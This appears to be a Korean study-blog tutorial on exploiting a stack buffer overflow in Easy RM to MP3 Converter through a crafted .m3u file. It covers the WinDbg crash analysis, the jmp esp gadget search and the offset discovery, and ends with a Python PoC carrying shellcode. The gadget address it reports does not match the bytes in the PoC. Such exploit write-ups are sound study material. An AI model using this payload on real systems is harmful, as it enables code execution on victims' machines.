
  
  

0. Info
----------
corelen 팀의 windows exploit tutorial 문서 part 1 인 Easy RM to MP3프로그램의 stack based overflow 취약점을 이용해 exploit을 해보겠다. os 환경은 window xp sp3 en 에서 진행 하였다. debugger는 windbg를 이용하였다.

![](https://lh4.googleusercontent.com/ZIcdxR1-jprVAu9b47F5fQqiW26GXSSQZLlqFlK0pxXVM_u7v2c9nLy3vKhaixVYB7L2aJncbuzAVCruYf2fh8bIirmCMQtissCqZEqfAnCWLSNsK01wvP30v8bPZ-txkncxH3I2)

  

exploit db에 검색하면 해당 취약점에 대한 정보와 당시 프로그램을 구할 수 있다. 내가 공부한 내용은 2009-07-16 Crazy_Hacker가 발견한 버그이다.

  

1. Vulnerability

----------

.m3u 포멧의 파일을 열 때 stack based overflow 취약점이 발생한다.

  

![](https://lh3.googleusercontent.com/cdQ3kcN9Jl-xJzLhVlyrhP3TcjbHh1ulzxnkeb-MwzUBkEJm5iyXcniDZIDNPZy2ZGi94ZBi8vR0noamKSlqwozzskZPybn-C310bTc295iiqjWiuzMBgResxCjJ4tTp2k6Ogrmr)

  

파이썬을 이용해 “A”를 30000개를 적어준다.

  

이를 Easy RM to MP3로 열게 되면

  

![](https://lh4.googleusercontent.com/nqYshKyZjKSXE3-97ciq9x7YerEG0wVglCVvkhx5v6Ml06MGY9ajkHTiozJUqybWKIU0hMHyrzwKxXooDiHlgKzasWZWfCxrUzmT4_gLUuXIa7Phu3pmBU_HI2vlnjel2AP4Rd2i)

  

크래시가 발생되고 비정상적으로 프로그램이 종료된다.

  

2. exploit

----------

이제 좀 더 정확한 정보를 얻기 위해서 windbg를 이용해서 eip가 덮혔는지 확인 해보겠다. eip가 덮히면 해커의 시나리오 대로 프로그램을 조작할 수 있기 때문에 exploit 가능성이 높아진다.

  

일단 windbg를 post-mortem 으로 등록해야 한다. 이 기능은 자동적으로 프로그램이 crash가 발생하여 비정상적으로 종료가 되면 windbg를 실행시켜 그 정보를 바로 확인 할 수 있게 해준다.

  

windbg가 설치 되어 있는 폴더 에 들어가서 windbg.exe -I 로 설정할 수 있다.

![](https://lh3.googleusercontent.com/g41REbmXii4w88afMS04xZ12VCdaX7d_-g9VAIOGRzUtdWQzqGPuYD4Pyc1W9RYbaDVhxnq5Ewlax2j7Xc0gCM4MuZXZSo1km32fqz124VRioXRcCMsHl2_HEw02OGVGSwJpIeba)

![](https://lh4.googleusercontent.com/dXVssplaFXF1iL07tlUmr4MXaLZEUUfIXWdlU1HMUmfglyzRelWqpS19ode9gwlwSuZT1kPc6DOTanqXZRhG_HXUpBCNQnQT6KCWWeNZYqIDFRdZ_9W6ULLCI3HDqZAqAQDDZbgN)

  

성공적으로 postmortem 으로 등록 되었다.

  
  

다시 한번 carsh.m3u 파일을 실행해보겠다.

  

![](https://lh3.googleusercontent.com/AY9E4YGM-Qs8WyJxUqT_HsYdevolpdenQo_y6qT2sh16bHHHo6UDo1D5Dpd_2pHHa-VqWEAVaFO_4ZB_YOyknWgfzs0tsV8F4CfNVo4n6OPQUZ0kb-4euZkXqWG8Aal_94J2OQK7)

  

crash가 나면서 자동적으로 windbg가 실행되고 레지스터 사이를 보니 eip가 AAAA 41414141로 바뀌어 있다. 즉, stack based overflow를 이용해서 ret을 조작해 eip를 조작할 수 있고, 해커의 시나리오 대로 프로그램을 조작할 수 있게 된다.

  

aslr이 적용 되어 있지 않기 때문에 쉘코드를 스택에 넣고 뛰면 되겠지만 주소에 \x00 바이트를 포함 하고 있어 exploit 할 수 없다.

  

다른 방법을 모색해야 하는데, 바로 jmp esp 가젯을 이용하는 것 이다.

  

(pwnable.kr echo1문제도 jmp esp 가젯을 이용했던 것 같다. 관련 풀이를 보면 왜 이 가젯을 이용하는지 알게 될 거다.)

  

간단하게 설명하자면, 함수 에필로그 leave ; ret ; 에서 ret이 실행 되기 전에 mov esp, ebp 구문이 있다.

  

esp를 ebp로 데려오는데, 그러면 esp는 ret뒤를 가리키게 된다. eip를 jmp esp 가젯을 실행 하면, ret뒤로 뛰게 되는 거다.

  

그러면 payload에서 ret뒤에 shellcode를 위치시키면 shellcode를 실행 할 수 있게 될 것 이다.

  

“jmp esp” 가젯은 .dll 파일에서 찾을 수 있다. .dll파일은 windbg가 로드 될 때 상단에 정보가 보인다.

  

![](https://lh5.googleusercontent.com/tEaaI_QEZnPHHRq8YbPIAc5inj3JjG418e4L8B0iRqsryTLpmKUP0HjsHSJCj1FXxH72H3fGe5ncS-MOfbr384nHOgkHhA05R2ZtBCqtV2RxKBGt_kLTQHNi_Qla_56KPTvqLm0A)

  

system32 에 있는 .dll에서 가젯을 구하면 해당 pc에선 poc가 작동하겠지만 다른 곳에선 poc가 작동 안 할 수 있다. 따라서 프로그램이 자체적으로 가지고 있는 .dll에서 가젯을 구하도록 하겠다.

  

다시 windbg를 실행하고 멀쩡한 easy rm to mp3를 attach 한다. 사용할 .dll은

  

01c80000 0214d000 C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll

  

를 사용 할 것이다.

  

![](https://lh5.googleusercontent.com/gChFTiFAoT820hGeoBEtQkVao23IOdbnmNpIgxKkMUJ098UmU36AloD27GqOdCx04PqzsZFMlz0NAGSMA8_LgjOIcnxIVyWvZlA74mAfkuR1GsAMmQJ_Xw0BZ9cg6ojZkBYSHxV7)

  

일단 “jmp esp” 의 opcode를 찾아야 한다.

  

![](https://lh4.googleusercontent.com/dlVn30KEQVtJ7BsTCUJAV8_sXM22b5b-Y6hKthMcGiJKY_-4uvhe6HXMjKcOLkFgY_G1hawGgjiQXXyfBjB96TlmzXCZKONIuaIagSC-WreA8lS8fkoS6aa-qOu59I-NfC7QiBU6)

a(assemble) 를 적고

  

jmp esp를 적는다.

  

그럼 7c901210에 jmp esp가 있는거다.

  

![](https://lh5.googleusercontent.com/yI1mZLaDrLHDIiK3KrQ9naY0rlwqND_P8drLnBEtBMvjXg-lutFezpSUqj1kaQ7artp66IDqcc71GIxGkIvAI0YZzJAFVF7M9j772dcENHHmUrYkS6mim5DTk6sejuHRUO-3CxXJ)

  

ff e4가 jmp esp의 opcode인 것을 확인 할 수 있다.( 사실 pwntool로 구하는 걸 블로그에 올렸었던 것 같지만.. 이 문서에서는 이렇게 소개한다.)

  

이제 dll에서 ff e4를 찾으면 된다.

  

01c80000 0214d000 C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll

  

이 dll에서 01c80000 0214d000이게 그 영역인데,

  

![](https://lh3.googleusercontent.com/PZFXbEHTMbc8J_OKgS2oyJFDdzgHvwok_Z7hwbgsfvjKIvTYGkmCau6jSZ7MJfdRRM-GALuJbcjVkzEwgCdV8tJhZ-1VkrwIkXt1sGJd2qTy7GcKuhNv1QNurZdBZSoa5pYCEkRy)

  

이렇게 search 할 수 있다. ff e4의 위치는 0x1e3f23a 이다.

  

생각해보니 ret의 위치를 안 찾았다.

  

메타스플로잇의 tool인 pattern_create.rb, pattern_offset을 이용해서 ret의 위치, offset을 쉽게 구할 수 있다.

  

![](https://lh4.googleusercontent.com/OafX36Bi6K5E7ldKH8Ix0dEznhmcdA7VvLABLIo6YZCmOcrn6wUIXfbqbg4kAZOmrM0KVhK0ciIAap-3XFzivH9LAfr_BUfY7ch2-cXKh_zaslPGK5BVj37fDyLbkWDLzqi4nbx_)

  

이렇게 30000개의 패턴을 뽑은 뒤,

  

.m3u파일에 넣는다.

  

![](https://lh4.googleusercontent.com/OeXyCSv6MlFMnB_9PzBCqegdEiG2MTyLlJsioLYB_PLkFury0BND38dsu4vY6nge0ZlnNAdRJQl1QoxrhL9nhKF3gAgvGLRmJwRFwhkn1cl5nzC2iH8Jyb18gmLdKUA62lnxLqZa)

  

생성 된 파일을 실행시켜 crash를 낸다.

  

windbg가 실행되면서 eip가 조작 되었을거다.

  

![](https://lh5.googleusercontent.com/O7teTfnP8HUoUCabBvasigwyTNKOAogTVz1L5OsD8293BvNn0MPXDv2GuMFxqrLcM5SJzcL8bhglGoY8LeCkswcORL4_uXxPnBFiMsVi397YR0-pA_rYKuFA3aeEwbWF6W21c-BO)

  

eip 0x48386b48이 적혀있다.

  

![](https://lh3.googleusercontent.com/CmM-1elm22MagOn0KsqFpBh358L8_-J-PS8UVL8AihtgdS-CmIF0kaUvn9qFPbpSJS-8Eiiv1S8rm3VO_etPMifNnjTTpnSxQOuxjER7oG-m_HMlGgi7QTDjF7s4Fz_QcERf4wUf)

  

이렇게 ./pattern_offset.rb [eip] [create 한 byte길이] 를 실행하면

  

![](https://lh4.googleusercontent.com/StDB55DtoRqr1RiD9vsPTz1nDWIykXaiWuU_u9J7WceRNMPuQc4evtnHmik9Hm7ifQKhlYD_395AifbZBaJNGfvsoJ6egaRwsz_RhB7GPR7JFMJvR_z5jVWzEeQeC3lGdaaeiOc9)

5784 부분과 26064부분이라고 나오는데 우리는 20000이상이니깐 26064부터 4바이트가 ret위치라는 것을 알 수 있다.

  

이제 바로 poc를 작성 해보겠다.

  

3. poc

----------

  ```python
  f =  open("C:\\Documents and Settings\\Administrator\\Desktop\\crash.m3u", "w")

gadget =  "\x3a\xf2\xd2\x01"

shellcode =  "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"  +"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"  +"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"  +"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"  +"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"  +"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"  +"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"  +"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"  +"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"  +"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"  +"\x7f\xe8\x7b\xca"

payload =  "A"*26064

payload += gadget

payload +=  "\x90"*50

payload += shellcode

payload +=  "\x90"*50

f.write(payload)

f.close()
```


  

사용한 쉘코드는 계산기를 띄우는 쉘코드이다.

  

생성된 crash.m3u를 실행 하게 되면

![](https://lh6.googleusercontent.com/SDdZuu6i1m-iaNLPukrxwUpBIiLEWNNDuB2s_40dNdH7yQOhRVuk7m_-x5a1xjC5EoBaV_1X80fS_YhFBrlGTYorv2egOzZAvJIkktoZcT0063TigeOGqMzPZUSj9EXBue38m7AJ)

  

성공적으로 계산기가 실행되었다.